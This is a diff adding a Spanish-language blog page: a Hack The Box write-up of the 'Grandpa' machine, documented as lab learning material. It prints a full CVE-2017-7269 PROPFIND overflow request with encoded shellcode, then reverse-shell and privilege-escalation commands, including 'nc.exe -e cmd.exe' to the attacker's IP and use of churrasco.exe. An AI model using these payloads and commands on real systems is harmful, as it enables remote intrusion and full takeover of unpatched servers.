@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB-Grandpa — themaxterone</title>
+<meta name="description" content="WriteUp de la máquina HTB Grandpa – Type: Easy">
+<meta property="og:title" content="HTB-Grandpa — themaxterone">
+<meta property="og:description" content="WriteUp de la máquina HTB Grandpa – Type: Easy">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="theme-color" content="#07090c">
+<link rel="icon" href="../assets/images/maxteravatar.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/site.css">
+
+</head>
+<body class="post-page">
+<div class="progress" aria-hidden="true"><div id="progress-bar"></div></div>
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="../" aria-label="themaxterone home"><img src="../assets/images/maxteravatar.png" alt="" width="32" height="32"><span><b>~/</b>themaxterone</span></a>
+    <button class="nav-toggle" type="button" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span></button>
+    <nav class="nav-links" id="nav-links">
+      <a href="../">home</a>
+      <a href="../writeups/" class="active">write-ups</a>
+      <a href="../writeups/?cat=Scripts">tools</a>
+      <a href="../about/">about</a>
+      <a class="nav-cta" href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github ↗</a>
+    </nav>
+  </div>
+</header>
+<main>
+<header class="post-head">
+  <div class="wrap narrow">
+    <nav class="crumbs" aria-label="Breadcrumb"><a href="../">home</a> / <a href="../writeups/">write-ups</a> / <span>HTB-Grandpa</span></nav>
+    <p class="eyebrow"><span class="dot"></span> machine write-up</p>
+    <h1>HTB-Grandpa <img class="title-icon" src="../assets/images/hackthebox.webp" alt="" width="36" height="36"></h1>
+    <div class="card-meta"><time datetime="2022-03-30">Mar 30, 2022</time><span>·</span><span>3 min read</span></div>
+    <div class="chips"><a class="chip" href="../writeups/?tag=HTB">HTB</a><a class="chip" href="../writeups/?tag=Easy">Easy</a></div>
+  </div>
+</header>
+<div class="wrap post-layout">
+  <aside class="toc" aria-label="Table of contents"><p class="toc-title">// contents</p><ol><li><a href="#reconocimiento">Reconocimiento</a></li><li><a href="#explotación">Explotación</a></li></ol></aside>
+  <article class="prose" lang="es">
+<p><img src="../assets/images/writeups/grandpa/grandpa.png" alt="" loading="lazy"></p>
+<p><a href="https://app.hackthebox.com/machines/13" target="_blank" rel="noopener noreferrer">Maquina</a> </p>
+<h2 id="reconocimiento"><a class="anchor" href="#reconocimiento" aria-hidden="true">#</a>Reconocimiento</h2>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code><span class="hljs-built_in">sudo</span> nmap -sCV --min-rate 5000 -Pn 10.10.10.14</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.14
+Host is up (0.045s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+| http-webdav-scan: 
+|   WebDAV <span class="hljs-built_in">type</span>: Unknown
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Server Type: Microsoft-IIS/6.0
+|   Server Date: Wed, 30 Mar 2022 08:16:08 GMT
+|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+<p>Vemos que tiene el puerto <strong>80 (http)</strong> abierto y la versión del servidor es <strong>Microsoft IIS httpd 6.0</strong> puede ser que sea vulnerable a <strong>CVE-2017-7269</strong></p>
+<h2 id="explotación"><a class="anchor" href="#explotación" aria-hidden="true">#</a>Explotación</h2>
+<p>Nos descargamos el exploit el cual no dará una reverse shell por la cual tendremos que tener un puerto a la escucha con netcat.</p>
+<p><a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269" target="_blank" rel="noopener noreferrer">CVE-2017-7269</a></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>git <span class="hljs-built_in">clone</span> https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>nc -lvp 443</code></pre></div>
+<p>Le damos permisos de ejecución al exploit y lo ejecutamos con nuesta ip y por el puerto que vamos a tener a la escucha.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.14.9 443</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>PROPFIND / HTTP/1.1
+Host: localhost
+Content-Length: 1744
+If: &lt;http://localhost/aaaaaaa￦ﾽﾨ￧ﾡﾣ￧ﾝﾡ￧ﾄﾳ￦ﾤﾶ￤ﾝﾲ￧ﾨﾹ￤ﾭﾷ￤ﾽﾰ￧ﾕﾓ￧ﾩﾏ￤ﾡﾨ￥ﾙﾣ￦ﾵﾔ￦ﾡﾅ￣ﾥﾓ￥ﾁﾬ￥ﾕﾧ￦ﾝﾣ￣ﾍﾤ￤ﾘﾰ￧ﾡﾅ￦ﾥﾒ￥ﾐﾱ￤ﾱﾘ￦ﾩﾑ￧ﾉﾁ￤ﾈﾱ￧ﾀﾵ￥ﾡﾐ￣ﾙﾤ￦ﾱﾇ￣ﾔﾹ￥ﾑﾪ￥ﾀﾴ￥ﾑﾃ￧ﾝﾒ￥ﾁﾡ￣ﾈﾲ￦ﾵﾋ￦ﾰﾴ￣ﾉﾇ￦ﾉﾁ￣ﾝﾍ￥ﾅﾡ￥ﾡﾢ￤ﾝﾳ￥ﾉﾐ￣ﾙﾰ￧ﾕﾄ￦ﾡﾪ￣ﾍﾴ￤ﾹﾊ￧ﾡﾫ￤ﾥﾶ￤ﾹﾳ￤ﾱﾪ￥ﾝﾺ￦ﾽﾱ￥ﾡﾊ￣ﾈﾰ￣ﾝﾮ￤ﾭﾉ￥ﾉﾍ￤ﾡﾣ￦ﾽﾌ￧ﾕﾖ￧ﾕﾵ￦ﾙﾯ￧ﾙﾨ￤ﾑﾍ￥ﾁﾰ￧ﾨﾶ￦ﾉﾋ￦ﾕﾗ￧ﾕﾐ￦ﾩﾲ￧ﾩﾫ￧ﾝﾢ￧ﾙﾘ￦ﾉﾈ￦ﾔﾱ￣ﾁﾔ￦ﾱﾹ￥ﾁﾊ￥ﾑﾢ￥ﾀﾳ￣ﾕﾷ￦ﾩﾷ￤ﾅﾄ￣ﾌﾴ￦ﾑﾶ￤ﾵﾆ￥ﾙﾔ￤ﾝﾬ￦ﾕﾃ￧ﾘﾲ￧ﾉﾸ￥ﾝﾩ￤ﾌﾸ￦ﾉﾲ￥ﾨﾰ￥ﾤﾸ￥ﾑﾈ￈ﾂ￈ﾂ￡ﾋﾀ￦ﾠﾃ￦ﾱﾄ￥ﾉﾖ￤ﾬﾷ￦ﾱﾭ￤ﾽﾘ￥ﾡﾚ￧ﾥﾐ￤ﾥﾪ￥ﾡﾏ￤ﾩﾒ￤ﾅﾐ￦ﾙﾍ￡ﾏﾀ￦ﾠﾃ￤ﾠﾴ￦ﾔﾱ￦ﾽﾃ￦ﾹﾦ￧ﾑﾁ￤ﾍﾬ￡ﾏﾀ￦ﾠﾃ￥ﾍﾃ￦ﾩﾁ￧ﾁﾒ￣ﾌﾰ￥ﾡﾦ￤ﾉﾌ￧ﾁﾋ￦ﾍﾆ￥ﾅﾳ￧ﾥﾁ￧ﾩﾐ￤ﾩﾬ&gt; (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb￧ﾥﾈ￦ﾅﾵ￤ﾽﾃ￦ﾽﾧ￦ﾭﾯ￤ﾡﾅ￣ﾙﾆ￦ﾝﾵ￤ﾐﾳ￣ﾡﾱ￥ﾝﾥ￥ﾩﾢ￥ﾐﾵ￥ﾙﾡ￦ﾥﾒ￦ﾩﾓ￥ﾅﾗ￣ﾡﾎ￥ﾥﾈ￦ﾍﾕ￤ﾥﾱ￤ﾍﾤ￦ﾑﾲ￣ﾑﾨ￤ﾝﾘ￧ﾅﾹ￣ﾍﾫ￦ﾭﾕ￦ﾵﾈ￥ﾁﾏ￧ﾩﾆ￣ﾑﾱ￦ﾽﾔ￧ﾑﾃ￥ﾥﾖ￦ﾽﾯ￧ﾍﾁ￣ﾑﾗ￦ﾅﾨ￧ﾩﾲ￣ﾝﾅ￤ﾵﾉ￥ﾝﾎ￥ﾑﾈ￤ﾰﾸ￣ﾙﾺ￣ﾕﾲ￦ﾉﾦ￦ﾹﾃ￤ﾡﾭ￣ﾕﾈ￦ﾅﾷ￤ﾵﾚ￦ﾅﾴ￤ﾄﾳ￤ﾍﾥ￥ﾉﾲ￦ﾵﾩ￣ﾙﾱ￤ﾹﾤ￦ﾸﾹ￦ﾍﾓ￦ﾭﾤ￥ﾅﾆ￤ﾼﾰ￧ﾡﾯ￧ﾉﾓ￦ﾝﾐ￤ﾕﾓ￧ﾩﾣ￧ﾄﾹ￤ﾽﾓ￤ﾑﾖ￦ﾼﾶ￧ﾍﾹ￦ﾡﾷ￧ﾩﾖ￦ﾅﾊ￣ﾥﾅ￣ﾘﾹ￦ﾰﾹ￤ﾔﾱ￣ﾑﾲ￥ﾍﾥ￥ﾡﾊ￤ﾑﾎ￧ﾩﾄ￦ﾰﾵ￥ﾩﾖ￦ﾉﾁ￦ﾹﾲ￦ﾘﾱ￥ﾥﾙ￥ﾐﾳ￣ﾅﾂ￥ﾡﾥ￥ﾥﾁ￧ﾅﾐ￣ﾀﾶ￥ﾝﾷ￤ﾑﾗ￥ﾍﾡ￡ﾏﾀ￦ﾠﾃ￦ﾹﾏ￦ﾠﾀ￦ﾹﾏ￦ﾠﾀ￤ﾉﾇ￧ﾙﾪ￡ﾏﾀ￦ﾠﾃ￤ﾉﾗ￤ﾽﾴ￥ﾥﾇ￥ﾈﾴ￤ﾭﾦ￤ﾭﾂ￧ﾑﾤ￧ﾡﾯ￦ﾂﾂ￦ﾠﾁ￥ﾄﾵ￧ﾉﾺ￧ﾑﾺ￤ﾵﾇ￤ﾑﾙ￥ﾝﾗ￫ﾄﾓ￦ﾠﾀ￣ﾅﾶ￦ﾹﾯ￢ﾓﾣ￦ﾠﾁ￡ﾑﾠ￦ﾠﾃ￧﾿ﾾ￯﾿﾿￯﾿﾿￡ﾏﾀ￦ﾠﾃ￑ﾮ￦ﾠﾃ￧ﾅﾮ￧ﾑﾰ￡ﾐﾴ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁ￩ﾎﾑ￦ﾠﾀ￣ﾤﾱ￦ﾙﾮ￤ﾥﾕ￣ﾁﾒ￥ﾑﾫ￧ﾙﾫ￧ﾉﾊ￧ﾥﾡ￡ﾐﾜ￦ﾠﾃ￦ﾸﾅ￦ﾠﾀ￧ﾜﾲ￧ﾥﾨ￤ﾵﾩ￣ﾙﾬ￤ﾑﾨ￤ﾵﾰ￨ﾉﾆ￦ﾠﾀ￤ﾡﾷ￣ﾉﾓ￡ﾶﾪ￦ﾠﾂ￦ﾽﾪ￤ﾌﾵ￡ﾏﾸ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁVVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A&gt;</code></pre></div>
+<p>Y por el netcat tendremos la ReverseShell.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>connect to [10.10.14.9] from (UNKNOWN) [10.10.10.14] 1031
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv&gt;whoami
+whoami
+nt authority\network service</code></pre></div>
+<p>El usuario que obtenemos es <strong>nt authority\network service</strong> y no de <strong>system</strong> y por lo tanto tendremos que elevar privilegios.</p>
+<p>Podemos ejecutar el comando <strong>systeminfo</strong> en la máquina víctima para pasarlo por el <a href="https://github.com/bitsadmin/wesng/blob/master/wes.py" target="_blank" rel="noopener noreferrer">wes.py</a> (python script para buscar exploits de windows)</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>C:\Documents and Settings&gt;systeminfo</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>python2 wes.py systeminfo.txt --exploits-only -i <span class="hljs-string">&quot;Elevation of Privilege&quot;</span></code></pre></div>
+<p>Entre todas las vluns que encontramos podemos ver la <strong>CVE-2008-1436</strong> que utiliza el exploit <a href="https://github.com/Re4son/Churrasco" target="_blank" rel="noopener noreferrer">churrasco.exe</a> para elevar privilegios.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>Date: 20090414
+CVE: CVE-2008-1436
+KB: KB952004
+Title: Vulnerabilities in Windows Could Allow Elevation of Privilege
+Affected product: Microsoft Windows Server 2003 x64 Edition 
+Affected component:
+Severity: Important
+Impact: Elevation of Privilege
+Exploit: https://www.exploit-db.com/exploits/6705</code></pre></div>
+<p>Nos descargamos el <a href="https://github.com/Re4son/Churrasco" target="_blank" rel="noopener noreferrer">churrasco.exe</a> y el <a href="https://github.com/int0x33/nc.exe" target="_blank" rel="noopener noreferrer">netcat.exe</a> y los servimos con un servidor smb para poder pasarselos a la máquina windows.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
+wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+
+impacket-smbserver share $(<span class="hljs-built_in">pwd</span>) -smb2support</code></pre></div>
+<p>Los descargamos en la carpeta Temp:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>C:\WINDOWS\Temp&gt;<span class="hljs-built_in">copy</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.9</span>\share\ch.exe
+<span class="hljs-built_in">copy</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.9</span>\share\ch.exe
+        <span class="hljs-number">1</span> file(s) copied.
+
+C:\WINDOWS\Temp&gt;<span class="hljs-built_in">copy</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.9</span>\share\nc.exe
+<span class="hljs-built_in">copy</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.9</span>\share\nc.exe
+        <span class="hljs-number">1</span> file(s) copied.
+
+C:\WINDOWS\Temp&gt;</code></pre></div>
+<p>Y nos podemos en escucha con netcat por un puerto diferente al usado.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>nc -lvp 444</code></pre></div>
+<p>Y ya podemos ejecutar el comando para obtener una reverse shell con <strong>churrasco.exe</strong></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>ch.exe <span class="hljs-literal">-d</span> <span class="hljs-string">&quot;nc.exe -e cmd.exe 10.10.14.9 444&quot;</span></code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>connect to <span class="hljs-function">[<span class="hljs-number">10.10</span><span class="hljs-type">.14.9</span>] <span class="hljs-title">from</span></span> (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-type">.10.14</span>] <span class="hljs-number">1037</span>
+Microsoft Windows [<span class="hljs-type">Version</span> <span class="hljs-number">5.2</span><span class="hljs-type">.3790</span>]
+(C) Copyright <span class="hljs-number">1985</span><span class="hljs-literal">-2003</span> Microsoft Corp.
+
+C:\WINDOWS\TEMP&gt;whoami
+whoami
+nt authority\system
+
+C:\WINDOWS\TEMP&gt;</code></pre></div>
+<p>Flag <strong>User Harry</strong>:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>C:\Documents and Settings\Harry\Desktop&gt;<span class="hljs-built_in">dir</span>
+<span class="hljs-built_in">dir</span>
+ Volume <span class="hljs-keyword">in</span> drive C has no label.
+ Volume Serial Number is FDCB<span class="hljs-literal">-B9EF</span>
+
+ Directory of C:\Documents and Settings\Harry\Desktop
+
+<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">05</span>:<span class="hljs-number">32</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          .
+<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">05</span>:<span class="hljs-number">32</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          ..
+<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">05</span>:<span class="hljs-number">32</span> PM                <span class="hljs-number">32</span> user.txt
+               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">32</span> bytes
+               <span class="hljs-number">2</span> <span class="hljs-built_in">Dir</span>(s)   <span class="hljs-number">1</span>,<span class="hljs-number">320</span>,<span class="hljs-number">251</span>,<span class="hljs-number">392</span> bytes free</code></pre></div>
+<p>Flag <strong>nt authority\system</strong>:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>C:\Documents and Settings\Administrator\Desktop&gt;<span class="hljs-built_in">dir</span>
+<span class="hljs-built_in">dir</span>
+ Volume <span class="hljs-keyword">in</span> drive C has no label.
+ Volume Serial Number is FDCB<span class="hljs-literal">-B9EF</span>
+
+ Directory of C:\Documents and Settings\Administrator\Desktop
+
+<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">05</span>:<span class="hljs-number">28</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          .
+<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">05</span>:<span class="hljs-number">28</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          ..
+<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">05</span>:<span class="hljs-number">29</span> PM                <span class="hljs-number">32</span> root.txt
+               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">32</span> bytes
+               <span class="hljs-number">2</span> <span class="hljs-built_in">Dir</span>(s)   <span class="hljs-number">1</span>,<span class="hljs-number">318</span>,<span class="hljs-number">543</span>,<span class="hljs-number">360</span> bytes free</code></pre></div>
+
+<p><a class="btn btn-primary" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269" target="_blank" rel="noopener noreferrer">View on GitHub ↗</a></p>
+  </article>
+</div>
+<nav class="wrap narrow pager" aria-label="More posts">
+  <a href="../HTB-Mirai/"><span>← older</span>HTB-Mirai</a>
+  <a class="right" href="../HTB-Granny/"><span>newer →</span>HTB-Granny</a>
+</nav>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p><span class="prompt">$</span> echo "stay curious, stay legal"</p>
+    <p class="muted">© 2026 themaxterone · Hack The Box write-ups &amp; tools</p>
+    <p><a href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github.com/themaxterone</a></p>
+  </div>
+</footer>
+<script src="../assets/js/site.js" defer></script>
+</body>
+</html>
